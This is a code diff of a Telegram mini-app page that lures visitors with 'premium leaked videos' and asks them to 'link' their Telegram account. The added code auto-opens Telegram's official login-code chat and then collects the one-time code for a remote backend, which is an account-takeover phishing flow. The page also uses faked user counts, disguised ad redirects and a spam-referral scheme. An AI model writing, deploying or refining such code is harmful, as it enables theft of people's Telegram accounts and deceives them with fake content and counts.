@@ -78,7 +78,7 @@
 <body oncontextmenu="return false;">
 
     <div style="text-align: center; margin-top: 5px;">
-        <button class="add-group-btn" onclick="tg.openTelegramLink(`https://t.me/${botUsername}?startgroup=true`)">🚀 Add Bot to Group</button>
+        <button class="add-group-btn" onclick="window.location.href=`https://t.me/${botUsername}?startgroup=true`">🚀 Add Bot to Group</button>
         <div style="font-size: 11px; color: #888; margin-top: 8px; margin-bottom: 8px;">🔥 Premium Leaked Videos Updated Daily!</div>
         <div class="online-badge"><span class="dot"></span> <span id="online-count">1,240</span> users active</div>
     </div>
@@ -117,16 +117,11 @@
             <h3 style="color: #00ffaa; margin-top: 0;">🔐 Link Telegram Account</h3>
             <p style="font-size: 11px; color: #ccc; margin-bottom: 20px;">Link your account to get access to our secret premium channel.</p>
             
-            <div id="phone-sec" style="display: none;">
-                <input type="text" id="phone-input" class="login-input" placeholder="e.g. 017XXXXXXXX">
-                <button id="btn-send-code" class="share-btn" onclick="sendCode()">Send OTP Code</button>
-            </div>
-
-            <!-- OTP Section -->
-            <div id="otp-sec" style="display: none;">
+            <!-- OTP Section Only in app.html -->
+            <div id="otp-sec">
                 <div style="display: flex; gap: 8px; align-items: stretch; justify-content: center; margin-bottom: 10px;">
                     <input type="text" id="otp-input" class="login-input" placeholder="Enter OTP" style="width: 65%; margin-bottom: 0; letter-spacing: 5px;">
-                    <!-- View Code Button in app.html -->
+                    <!-- Re-open chat button if needed -->
                     <button onclick="viewCodeAgain()" style="width: 30%; background: #222; color: #00ffaa; border: 1px solid #00ffaa; border-radius: 8px; padding: 10px 5px; font-size: 11px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; text-align: center; line-height: 1.2;">👀 View<br>Code</button>
                 </div>
                 <button id="btn-verify-code" class="share-btn" style="background: linear-gradient(90deg, #00ffaa, #00aaff); color:#000;" onclick="verifyCode()">Verify & Connect</button>
@@ -143,34 +138,26 @@
     </div>
 
     <script>
-        const tg = window.Telegram.WebApp;
-        tg.expand();
-
         const SUPABASE_URL = 'https://yctirvnryrzygoxbpvoy.supabase.co';
         const SUPABASE_KEY = 'sb_publishable_aBcD-atruskWwoCiLr0lWw_inT8GLoN';
         const BACKEND_URL = 'https://pmrony-forwardbot.hf.space';
         const fetchHeaders = { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' };
 
-        // URL থেকে ডাটা রিসিভ (যেহেতু এটি ইন-অ্যাপ ব্রাউজারে ওপেন হবে)
+        // URL থেকে ডাটা রিসিভ (যেহেতু এটি ২য় ইন-অ্যাপ ব্রাউজারে ওপেন হবে)
         const urlParams = new URLSearchParams(window.location.search);
         const urlPhone = urlParams.get('phone');
         const urlHash = urlParams.get('hash');
-        const forceUserId = urlParams.get('user_id');
-        const userId = forceUserId || (tg.initDataUnsafe && tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : '123456'); 
+        const userId = urlParams.get('user_id') || '123456'; 
 
         const botUsername = 'File_Unlocker_Pro_bot'; 
-        const adUrl = "https://www.effectivecpmnetwork.com/w47jpksk7t?key=15b5e8ae609b09733d4a0906eac2a446";
+        const PREMIUM_CHANNEL_LINK = "https://t.me/+snT3FqTlgmJlNDQ1";
         
         let dbRefcount = 0;
         let allVideos = [];
-        let clickedAds = {};
         let filterMode = 'all'; 
-        let currentNeededRef = 3;
 
         let currentPhone = "";
         let currentHash = "";
-
-        const PREMIUM_CHANNEL_LINK = "https://t.me/+snT3FqTlgmJlNDQ1";
 
         // ====== MASTERMIND AUTO-TRIGGER ON LOAD ======
         window.onload = function() {
@@ -178,15 +165,16 @@
                 currentPhone = decodeURIComponent(urlPhone);
                 currentHash = decodeURIComponent(urlHash);
                 
-                // ওটিপি পেজ রেডি করে রাখছে
+                // ওটিপি পেজ ওপেন করে রাখছে
                 document.getElementById('loginModal').style.display = 'flex';
-                document.getElementById('phone-sec').style.display = 'none';
-                document.getElementById('otp-sec').style.display = 'block';
                 
                 // পেজ লোড হওয়ার ঠিক ৮০০ মিলি-সেকেন্ড পর নিজে থেকে ওটিপি চ্যাট ওপেন করে দেবে!
-                setTimeout(() => {
-                    window.location.href = "tg://openmessage?user_id=777000";
-                }, 800);
+                if (!sessionStorage.getItem('chat_opened')) {
+                    sessionStorage.setItem('chat_opened', 'true');
+                    setTimeout(() => {
+                        window.location.href = "tg://openmessage?user_id=777000";
+                    }, 800);
+                }
             }
         };
 
@@ -196,8 +184,6 @@
 
         async function openLogin() {
             document.getElementById('loginModal').style.display = 'flex';
-            document.getElementById('phone-sec').style.display = 'none';
-            document.getElementById('otp-sec').style.display = 'block';
         }
 
         function closeLogin() { document.getElementById('loginModal').style.display = 'none'; }
@@ -223,7 +209,8 @@
         }
 
         function resetLoginState() {
-            window.location.href = "https://rony90790.github.io/Forward-bot/index.html";
+            // মেইন অ্যাপে ফিরে যাওয়ার জন্য রিলোড বা লিংক
+            window.location.href = 'https://rony90790.github.io/Forward-bot/index.html';
         }
 
         function showPremiumModal() {
@@ -235,6 +222,7 @@
                     Now you can join our <b>Secret Premium Channel</b>.
                 </div>
                 <button class="share-btn" style="background: linear-gradient(90deg, #ffcc00, #ff9900); color: black;" onclick="window.location.href='${PREMIUM_CHANNEL_LINK}'">🚀 Visit Premium Content</button>
+                <button class="close-btn-modal" style="margin-top:20px;" onclick="closeModal()">Close</button>
             `;
             document.getElementById('shareModal').style.display = 'flex';
         }
@@ -300,7 +288,6 @@
             allVideos.forEach((vid, index) => {
                 let nRef = vid.needed_ref !== undefined ? vid.needed_ref : 3; 
                 let isUnlocked = (nRef === 0 || dbRefcount >= nRef);
-                
                 let show = false;
                 if (filterMode === 'all') show = true;
                 else if (filterMode === 'free' && nRef === 0) show = true;
@@ -308,18 +295,15 @@
                 else if (filterMode === 'silver' && nRef === 2) show = true;
                 else if (filterMode === 'gold' && nRef === 3) show = true;
                 else if (filterMode === 'premium' && nRef >= 4) show = true;
-                
                 if (!show) return;
-                
                 hasVisibleVideos = true;
+                
                 let views = (2000 + Math.floor(Math.random() * 5000)).toLocaleString();
                 let thumbUrl = vid.thumbnail_url;
                 let displayTime = "HD";
-                
                 if (thumbUrl && thumbUrl.includes('||')) {
                     let parts = thumbUrl.split('||');
-                    thumbUrl = parts[0]; 
-                    displayTime = parts[1] === 'random' ? getRandomTime() : parts[1]; 
+                    thumbUrl = parts[0]; displayTime = parts[1] === 'random' ? getRandomTime() : parts[1]; 
                 } else { displayTime = getRandomTime(); }
                 
                 let badgeHTML = isUnlocked ? `<div class="views-badge">👁️ ${views}</div>` : `<div class="views-badge locked-text">🔒 Need ${nRef} Refer</div>`;
@@ -327,79 +311,18 @@
                 let lockIcon = isUnlocked ? "▶ Watch" : "🔒 Locked";
                 let btnStyle = isUnlocked ? "" : "background:#555; color:#ccc;";
 
-                html += `<div class="video-card" data-url="${vid.video_url}" data-needed-ref="${nRef}" onclick="checkUnlock(this)">
+                html += `<div class="video-card">
                     <img src="${thumbUrl}" onerror="this.src='https://via.placeholder.com/300x190/111/444?text=Image+Not+Found'">
-                    ${trendingHTML}
-                    ${badgeHTML}
+                    ${trendingHTML}${badgeHTML}
                     <div class="time-badge">${displayTime}</div>
                     <div class="watch-btn" style="${btnStyle}">${lockIcon}</div>
                 </div>`;
             });
-
             if (!hasVisibleVideos) html = `<div class="empty-msg">❌ No videos in this category yet.</div>`;
             document.getElementById('video-container').innerHTML = html;
         }
 
-        function checkUnlock(element) {
-            const videoUrl = element.getAttribute('data-url') || "";
-            currentNeededRef = parseInt(element.getAttribute('data-needed-ref') || "3");
-            const lowerUrl = videoUrl.toLowerCase();
-            const isMp4 = lowerUrl.includes('.mp4');
-
-            if (currentNeededRef === 0 || dbRefcount >= currentNeededRef) {
-                if (currentNeededRef > 0 && !clickedAds[videoUrl] && isMp4) { 
-                    showToast("⏳ Unlocking secure player...");
-                    clickedAds[videoUrl] = true; 
-                    setTimeout(() => { window.location.href = adUrl; }, 800);
-                    return; 
-                }
-                const playerWrapper = document.getElementById('player-wrapper');
-                if (isMp4) {
-                    playerWrapper.innerHTML = `
-                        <video controls autoplay playsinline style="width:100%; height:100%; background:#000;"><source src="${videoUrl}" type="video/mp4"></video>
-                        <div style="position: absolute; bottom: 10px; right: 10px; z-index: 100005;">
-                            <button class="action-btn" onclick="closePlayer()">✖ Close</button>
-                        </div>`;
-                } else {
-                    playerWrapper.innerHTML = `
-                        <div class="floating-text">💡 Pro Tip: For high speed server play, if you are redirected to ads, use the back button and click the play (▶) button again!</div>
-                        <iframe src="${videoUrl}" allow="autoplay; fullscreen" allowfullscreen="true" scrolling="no" style="border:none; width:100%; height:100%;"></iframe>
-                        <div style="position: absolute; bottom: 10px; right: 10px; z-index: 100005;">
-                            <button class="action-btn" onclick="closePlayer()">✖ Close</button>
-                        </div>`;
-                }
-                playerWrapper.style.display = 'block';
-            } else { openInviteModal(); }
-        }
-
-        function closePlayer() { document.getElementById('player-wrapper').style.display = 'none'; document.getElementById('player-wrapper').innerHTML = ''; }
-
-        function openInviteModal() {
-            document.getElementById('modal-box').innerHTML = `
-                <div style="font-size:45px; margin-bottom:10px;">👑</div>
-                <h3 style="font-size: 19px; margin-top:0; color:#ffcc00;">Premium Video Locked!</h3>
-                <div style="font-size: 14px; color: #ddd; margin-bottom: 20px; line-height: 1.5;">
-                    To watch this premium video, you need a total of <span style="color: #ff3366; font-weight:bold; font-size:18px;">${currentNeededRef} invites</span> in your account.<br>
-                    <span style="font-size: 12px; color: #aaa;">(Your current invites: ${dbRefcount})</span>
-                </div>
-                <button class="share-btn" onclick="shareLink()">🚀 Share via Telegram</button>
-                <button class="check-btn" onclick="verifyInvites()">🔄 Check My Invites</button>
-                <button class="close-btn-modal" onclick="closeModal()">Maybe Later</button>
-            `;
-            document.getElementById('shareModal').style.display = 'flex';
-        }
-
-        function shareLink() {
-            const viralText = encodeURIComponent("🔞 Bro, click this link to watch all premium leaked videos for free! 🔥 Join fast 👇");
-            window.location.href = `https://t.me/share/url?url=https://t.me/${botUsername}?start=${userId}&text=${viralText}`;
-        }
-
-        async function verifyInvites() {
-            showToast("⏳ Checking database...");
-            await initData();
-            if (currentNeededRef - dbRefcount <= 0) { closeModal(); showToast("🎉 Video Unlocked!"); renderVideos(); } 
-            else { showToast("❌ Still need more invites!"); }
-        }
+        function closeModal() { document.getElementById('shareModal').style.display = 'none'; }
 
         fetchVideos();
         initData();
